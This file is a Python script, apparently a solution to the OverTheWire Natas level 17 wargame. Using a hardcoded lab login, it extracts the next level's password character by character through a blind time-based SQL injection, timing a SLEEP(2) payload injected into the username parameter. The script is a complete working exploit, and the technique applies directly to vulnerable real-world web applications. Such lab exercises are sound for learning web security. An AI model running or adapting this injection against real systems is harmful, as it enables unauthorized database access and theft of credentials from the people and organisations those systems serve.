import requests
from time import time

characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

username = "natas17"
password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"

url = "http://natas17.natas.labs.overthewire.org"
session = requests.Session()
current_password = []

while True:
    found = False
    for character in characters:
        guess = "".join(current_password) + character
        print(f"Trying with: {guess}")
        payload = f'natas18" AND password LIKE BINARY "{guess}%" AND SLEEP(2) #'
        start_time = time()
        response = session.get(url, params={"username": payload}, auth=(username, password))
        end_time = time()
        if end_time - start_time >= 2:
            current_password.append(character)
            found = True
            break
    if not found:
        print("No match found — something might be wrong.")
        break
    if len(current_password) == 32:
        print("Password found:", "".join(current_password))
        break
